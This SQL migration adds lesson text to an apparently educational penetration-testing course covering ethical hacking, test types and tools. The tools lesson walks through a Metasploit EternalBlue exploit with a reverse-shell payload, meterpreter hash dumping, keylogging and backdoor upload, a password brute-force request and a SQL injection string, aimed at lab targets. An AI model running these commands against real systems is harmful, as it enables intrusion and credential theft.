-- CyberSkill Platform - Enhanced Lesson Content
-- Version: 1.2.0
-- Description: Adds comprehensive, detailed content to lessons with examples, exercises, and practical scenarios

-- ============================================================================
-- ENHANCED CONTENT FOR PENETRATION TESTING PATH
-- ============================================================================

-- Update lessons in Section 1.1: What is Penetration Testing?
UPDATE lessons SET content = 
'# Introduction to Ethical Hacking

## What is Ethical Hacking?

Ethical hacking, also known as penetration testing or white-hat hacking, is the practice of intentionally probing computer systems, networks, and applications to discover security vulnerabilities before malicious actors can exploit them.

## Key Principles

### 1. Authorization
Always obtain written permission before testing any system. Unauthorized access is illegal, even with good intentions.

### 2. Scope Definition
Clearly define what systems, networks, and applications are in scope for testing.

### 3. Confidentiality
Maintain strict confidentiality of all findings and sensitive information discovered during testing.

## Types of Ethical Hackers

- **White Hat**: Authorized security professionals who test systems with permission
- **Black Hat**: Malicious hackers who break into systems illegally
- **Gray Hat**: Hackers who may violate laws but without malicious intent

## Real-World Impact

According to IBM''s Cost of a Data Breach Report 2023:
- Average cost of a data breach: $4.45 million
- Average time to identify a breach: 204 days
- Average time to contain a breach: 73 days

Ethical hackers help organizations identify and fix vulnerabilities before they can be exploited, potentially saving millions in breach costs.

## Career Opportunities

Ethical hacking offers excellent career prospects:
- Penetration Tester: $75,000 - $150,000/year
- Security Consultant: $90,000 - $180,000/year
- Bug Bounty Hunter: Variable, top hunters earn $100,000+/year

## Exercise

**Reflection Questions:**
1. Why is written authorization critical before conducting any security testing?
2. What are the potential legal consequences of unauthorized hacking?
3. How does ethical hacking differ from malicious hacking in terms of intent and methodology?

## Next Steps

In the next lesson, you''ll learn about different types of penetration tests and when each approach is most appropriate.'
WHERE section_id = 1 AND name = 'Introduction to Ethical Hacking';

UPDATE lessons SET content = 
'# Types of Penetration Tests

## Overview

Penetration tests can be categorized based on the amount of information provided to the tester and the systems being tested.

## 1. Black Box Testing

### Definition
The tester has no prior knowledge of the target system''s internal workings.

### Characteristics
- Simulates an external attacker
- No credentials or internal documentation provided
- Tests from an outsider''s perspective
- Most time-consuming approach

### Example Scenario
```
Target: www.example-company.com
Information Given: Only the company name and website URL
Tester''s Task: Discover and exploit vulnerabilities without insider knowledge
```

### Advantages
- Most realistic simulation of external attack
- Unbiased assessment
- Tests security from attacker''s viewpoint

### Disadvantages
- Time-consuming
- May miss internal vulnerabilities
- Higher cost due to extended timeline

## 2. White Box Testing

### Definition
The tester has complete knowledge of the target system, including source code, architecture diagrams, and credentials.

### Characteristics
- Full access to system documentation
- Source code review included
- Network diagrams provided
- Credentials for testing accounts

### Example Scenario
```
Target: Internal web application
Information Given:
- Complete source code repository
- Database schema
- API documentation
- Test account credentials
- Network architecture diagrams
```

### Advantages
- Comprehensive coverage
- Faster identification of vulnerabilities
- Can test complex logic and business rules
- More cost-effective per vulnerability found

### Disadvantages
- May not reflect real-world attack scenarios
- Requires more preparation time
- Tester bias possible

## 3. Gray Box Testing

### Definition
The tester has partial knowledge of the system, typically user-level access.

### Characteristics
- Limited credentials provided
- Some documentation available
- Simulates insider threat or compromised account
- Balanced approach

### Example Scenario
```
Target: Corporate intranet
Information Given:
- Standard employee account credentials
- Basic network topology
- List of internal applications
Task: Escalate privileges and access sensitive data
```

### Advantages
- Balances realism with efficiency
- Tests both external and internal security
- Simulates common attack vectors
- Cost-effective

### Disadvantages
- May not be as thorough as white box
- Not as realistic as black box for external threats

## Choosing the Right Approach

| Factor | Black Box | Gray Box | White Box |
|--------|-----------|----------|-----------|
| Time Required | High | Medium | Low-Medium |
| Cost | High | Medium | Low-Medium |
| Realism | High | Medium | Low |
| Coverage | Low-Medium | Medium | High |
| Best For | External threats | Insider threats | Code review |

## Practical Exercise

**Scenario Analysis:**

Your client, a financial services company, wants to test their online banking application. They have the following concerns:

1. External attackers trying to breach customer accounts
2. Potential insider threats from employees
3. Code-level vulnerabilities in their custom application

**Question:** Which type(s) of penetration test would you recommend and why?

**Answer Framework:**
- Identify the primary threats
- Match test types to threat models
- Consider budget and time constraints
- Recommend a phased approach if needed

## Real-World Case Study

**Target Corporation Data Breach (2013)**

- **Attack Vector**: Compromised HVAC vendor credentials (Gray Box scenario)
- **Impact**: 40 million credit card numbers stolen
- **Cost**: $162 million in settlements
- **Lesson**: Gray box testing could have identified the weak vendor access controls

## Key Takeaways

1. **Black Box** = External attacker perspective
2. **White Box** = Comprehensive internal review
3. **Gray Box** = Insider threat simulation
4. **Hybrid Approach** = Often most effective in practice

## Next Lesson Preview

In the next lesson, you''ll explore the essential tools used in penetration testing, including Kali Linux, Metasploit, and Burp Suite.'
WHERE section_id = 2 AND name = 'Types of Penetration Tests';

UPDATE lessons SET content = 
'# Penetration Testing Tools Overview

## Introduction

Professional penetration testers rely on a comprehensive toolkit to identify, exploit, and document security vulnerabilities. This lesson introduces the essential tools you''ll use throughout your penetration testing career.

## 1. Kali Linux

### What is Kali Linux?

Kali Linux is a Debian-based Linux distribution specifically designed for penetration testing and security auditing. It comes pre-installed with over 600 security tools.

### Key Features

- **Pre-configured Environment**: Ready-to-use penetration testing platform
- **Regular Updates**: Maintained by Offensive Security
- **Extensive Tool Collection**: Covers all phases of penetration testing
- **Customizable**: Can be tailored to specific testing needs

### Installation Options

```bash
# Download from official website
https://www.kali.org/downloads/

# Installation methods:
1. Bare metal installation
2. Virtual machine (VMware/VirtualBox)
3. Docker container
4. Windows Subsystem for Linux (WSL)
5. Cloud deployment (AWS/Azure)
```

### Essential Kali Tools by Category

**Information Gathering:**
- nmap, masscan, recon-ng, theHarvester

**Vulnerability Analysis:**
- OpenVAS, Nikto, SQLMap, WPScan

**Exploitation:**
- Metasploit Framework, BeEF, Social Engineering Toolkit

**Post-Exploitation:**
- Mimikatz, PowerSploit, Empire

**Password Attacks:**
- John the Ripper, Hashcat, Hydra, Medusa

## 2. Metasploit Framework

### Overview

Metasploit is the world''s most popular penetration testing framework, providing tools for discovering, exploiting, and validating vulnerabilities.

### Architecture

```
Metasploit Framework
├── Exploits (2000+)
├── Payloads (500+)
├── Auxiliary Modules (1000+)
├── Post-Exploitation Modules (300+)
└── Encoders & NOPs
```

### Basic Usage

```bash
# Start Metasploit console
msfconsole

# Search for exploits
msf6 > search type:exploit platform:windows smb

# Select an exploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Show required options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Set target
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# Set payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50

# Execute exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

### Meterpreter Shell

Once you gain access, Meterpreter provides powerful post-exploitation capabilities:

```bash
# System information
meterpreter > sysinfo

# List processes
meterpreter > ps

# Migrate to another process
meterpreter > migrate 1234

# Dump password hashes
meterpreter > hashdump

# Take screenshot
meterpreter > screenshot

# Enable keylogger
meterpreter > keyscan_start
meterpreter > keyscan_dump

# Upload/download files
meterpreter > upload /root/backdoor.exe C:\\Windows\\Temp
meterpreter > download C:\\Users\\Admin\\Documents\\sensitive.docx
```

## 3. Burp Suite

### Overview

Burp Suite is the leading web application security testing tool, used by security professionals worldwide.

### Editions

- **Community Edition**: Free, basic features
- **Professional Edition**: $449/year, advanced scanning
- **Enterprise Edition**: Continuous scanning for large organizations

### Key Components

#### 1. Proxy
Intercepts and modifies HTTP/HTTPS traffic between browser and server.

```
Browser → Burp Proxy → Web Server
         ↓
    Intercept & Modify
```

#### 2. Scanner (Pro only)
Automatically discovers vulnerabilities:
- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- And 100+ other vulnerability types

#### 3. Intruder
Automated customized attacks:

```
# Example: Password brute force
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=§password§

# Intruder will try:
password=password123
password=admin123
password=letmein
... (from wordlist)
```

#### 4. Repeater
Manually modify and resend requests:

```
# Original Request
GET /api/user/123 HTTP/1.1

# Modified Request (testing for IDOR)
GET /api/user/124 HTTP/1.1
GET /api/user/125 HTTP/1.1
```

#### 5. Sequencer
Analyzes randomness of session tokens:

```
Collected 10,000 session tokens
Analyzing entropy...
Result: WEAK - Predictable pattern detected
Recommendation: Implement cryptographically secure random number generator
```

### Practical Example: Finding SQL Injection

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Navigate to target application
3. Submit a form with user input
4. Intercept the request in Burp
5. Send to Repeater
6. Modify parameter: username=admin' OR '1'='1
7. Observe response for SQL errors or unexpected behavior
8. If vulnerable, escalate to full exploitation
```

## 4. Nmap (Network Mapper)

### Overview

Nmap is the industry-standard tool for network discovery and security auditing.

### Basic Scans

```bash
# Ping scan (discover live hosts)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan)
nmap -sS 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.168.1.100

# Scan specific ports
nmap -p 80,443,8080 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100
```

### NSE (Nmap Scripting Engine)

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# SMB enumeration
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100

# HTTP enumeration
nmap --script http-enum 192.168.1.100

# SSL/TLS testing
nmap --script ssl-enum-ciphers -p 443 192.168.1.100
```

### Output Formats

```bash
# Normal output
nmap -oN scan_results.txt 192.168.1.100

# XML output (for parsing)
nmap -oX scan_results.xml 192.168.1.100

# Grepable output
nmap -oG scan_results.gnmap 192.168.1.100

# All formats
nmap -oA scan_results 192.168.1.100
```

## Tool Selection Matrix

| Phase | Primary Tool | Alternative | Purpose |
|-------|--------------|-------------|---------|
| Reconnaissance | Nmap | Masscan | Network discovery |
| Web Testing | Burp Suite | OWASP ZAP | Web app security |
| Exploitation | Metasploit | Manual exploits | Vulnerability exploitation |
| Password Cracking | Hashcat | John the Ripper | Credential attacks |
| Post-Exploitation | Meterpreter | PowerShell Empire | Maintain access |

## Hands-On Lab Exercise

### Setup Your Testing Environment

**Step 1: Install Kali Linux**
```bash
# Download Kali Linux VM
# Import into VirtualBox/VMware
# Update system
sudo apt update && sudo apt upgrade -y
```

**Step 2: Install Metasploitable 2 (Vulnerable Target)**
```bash
# Download from SourceForge
# Import into same virtual network as Kali
# Default credentials: msfadmin/msfadmin
```

**Step 3: Practice Scanning**
```bash
# From Kali, scan Metasploitable
nmap -sV -A <metasploitable-ip>

# Identify open services
# Note vulnerable versions
```

**Step 4: Exploit a Vulnerability**
```bash
# Start Metasploit
msfconsole

# Search for vsftpd exploit (known vulnerability in Metasploitable)
search vsftpd

# Use the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <metasploitable-ip>
exploit

# You should get a shell!
```

## Best Practices

### 1. Tool Maintenance
```bash
# Update Kali Linux regularly
sudo apt update && sudo apt full-upgrade -y

# Update Metasploit
msfupdate
```

### 2. Documentation
- Screenshot every step
- Save all command output
- Document findings immediately
- Use tools like CherryTree or KeepNote

### 3. Legal Compliance
- Only test systems you have permission to test
- Stay within defined scope
- Report findings responsibly
- Maintain confidentiality

### 4. Continuous Learning
- Follow security blogs (Offensive Security, Rapid7)
- Practice on legal platforms (HackTheBox, TryHackMe)
- Attend security conferences (DEF CON, Black Hat)
- Obtain certifications (OSCP, CEH, GPEN)

## Common Mistakes to Avoid

1. **Running scans without permission** → Legal consequences
2. **Using default settings** → Easily detected
3. **Not documenting findings** → Incomplete reports
4. **Ignoring false positives** → Wasted time
5. **Over-relying on automated tools** → Missing manual vulnerabilities

## Resources for Further Learning

### Official Documentation
- Kali Linux: https://www.kali.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/burp/documentation
- Nmap: https://nmap.org/book/

### Practice Platforms
- HackTheBox: https://www.hackthebox.eu/
- TryHackMe: https://tryhackme.com/
- PentesterLab: https://pentesterlab.com/
- VulnHub: https://www.vulnhub.com/

### Video Tutorials
- IppSec (HackTheBox walkthroughs)
- The Cyber Mentor
- John Hammond
- LiveOverflow

## Quiz Preparation

Test your knowledge:

1. What is the difference between Kali Linux and a regular Linux distribution?
2. Name three phases of penetration testing and the primary tool for each.
3. What is Meterpreter and why is it powerful?
4. How does Burp Suite''s Proxy component work?
5. What is the purpose of Nmap''s NSE scripts?

## Next Steps

In the next module, you''ll learn **Reconnaissance and Information Gathering** techniques, where you''ll use these tools to discover information about target systems before attempting exploitation.

Remember: **With great power comes great responsibility.** Always use these tools ethically and legally!'
WHERE section_id = 3 AND name = 'Penetration Testing Tools Overview';

-- Add more comprehensive content for other critical lessons
-- This is just a sample - you can continue adding more detailed content for other lessons

COMMIT;

-- Made with Bob
